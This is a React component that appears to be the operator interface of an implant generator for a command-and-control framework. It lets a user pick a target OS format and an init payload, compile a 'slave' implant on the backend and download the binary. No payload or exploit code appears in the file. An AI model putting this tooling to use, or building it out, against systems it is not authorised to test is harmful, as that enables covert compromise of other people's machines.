import { useEffect, useState } from "react";
import { Button, Container, Form, InputGroup } from "react-bootstrap";
import UserService from "../services/UserService";


const ImlantPage = () => {

    const userService = new UserService()
    const [payloads, setPayloads] = useState([]);
    const [errorText, setErrorText] = useState();
    const [compileError, setCompileError] = useState("");
    const [os, setOS] = useState("");
    const [payloadVars, setPayloadVars] = useState({});
    const [initPayload, setInitPayload] = useState("");
    const [implantLink, setImplantLink] = useState({});
    
    useEffect(() => {
        setInterval(() => {
        
            userService.getPayloads().then((res) => {

                setPayloads(res.data);

            }).catch((err) => {
                
                if (err.code == "ERR_NETWORK") {
                    localStorage.clear();
                    window.location.replace("/?error=reset");
                    return;
                }

                console.error(err);
            })    
        }, 1000)
    },[])

    const generateSlave = () => {
        
        userService.generateSlave(os, initPayload.id, payloadVars).then((res) => {
            
            setImplantLink({
                id:  res.data.path,
                name: os
            });
        }).catch((err) => {

            if (err.code == "ERR_NETWORK") {
                localStorage.clear();
                window.location.replace("/?error=reset");
                return;
            }

            if (err.response.data.compileError) {
                setCompileError(err.response.data.compileError);
            }

            setErrorText(err.response.data.message);

            console.error("Creating new implant failed!")
            console.error(err);
        })
    }

    const downloadImplant = (id) => {
        userService.downloadImplant(id).then(res => {

            // Place data in URL object.
            const href = URL.createObjectURL(res.data);

            // Create download link.
            const link = document.createElement('a');
            link.href = href;
            link.setAttribute("download", "implant");
            document.body.appendChild(link);

            link.click(); // Download the data.

            // Clean up link element and remove URL object.
            document.body.removeChild(link);
            URL.revokeObjectURL(href);


        }).catch((err) => {

            console.error("Error occured!")
            setErrorText("Failed to download the generated implant!")
            console.error(err);
        })
    }

    const pickPayload = (e) => {
        setInitPayload(payloads[e.target.value]);

        // If selected payload has variables.
        if (payloads[e.target.value].variables) {

            let payVars = [];
            payloads[e.target.value].variables.forEach((v) => {
                payVars.push({"name": v.varname, "value": null});
            });
            
            setPayloadVars(payVars);
        }
    }
    const varChange = (e) => {
        const {name, value} = e.target;

        let newPayloadVars = payloadVars.map((v) => {
            if (v.name == name) {
                v.value = value;
            }

            return v;
        })

        setPayloadVars(newPayloadVars);
    }
    
    return (
        <Container>
            <h1>Implant generator</h1>
            <div>
                <InputGroup>
                    <InputGroup.Text>Target OS</InputGroup.Text>
                    <Form.Select onChange={(e) => setOS(e.target.value)}>
                        <option>Select OS</option>
                        <option value="ELF32">ELF 32 bit</option>
                        <option value="ELF64">ELF64 bit</option>
                        <option value="PE32">PE 32 bit</option>
                        <option value="PE64">PE 64 bit</option>
                        <option value="MACOS">MacOS</option>
                    </Form.Select>
                </InputGroup>
                <InputGroup>
                    <InputGroup.Text>Init payload</InputGroup.Text>
                    <Form.Select onChange={pickPayload}>
                        <option value="none">No init payload</option>
                        {
                            payloads ? payloads.map((payload, index) => (
                                <option value={index}>{payload.name}</option>
                            )) : <></>
                        }
                    </Form.Select>
                </InputGroup>

                {
                    initPayload ? <p>{initPayload.description}</p> : <></>
                }
                {
                        initPayload && initPayload.variables ?
                        initPayload.variables.map((v) => (
                                <>
                                <InputGroup>
                                    <InputGroup.Text>{v.varname} ({v.vartype})</InputGroup.Text>
                                    <Form.Control placeholder={v.description} onChange={varChange} name={v.varname}/>
                                </InputGroup>
                                </>
                            )) : <></>
                    }
                <br/>
                {
                    errorText ? <p style={{color: "red"}}>{errorText}</p> : <></>
                }
                <br/>
                { 
                    compileError.length > 0 ? <pre>{compileError}</pre> : <></>
                }
                <br/>
                <Button variant="outline-primary" onClick={() => generateSlave()}>Generate implant</Button>
                <br/>
                {
                    implantLink.id ? <p>In order to download the implant binary click <Button variant="outline-secondary" onClick={() => downloadImplant(implantLink.id)}>{implantLink.name}</Button> </p> : <></>
                }
            </div>
        </Container>
    )
}

export default ImlantPage;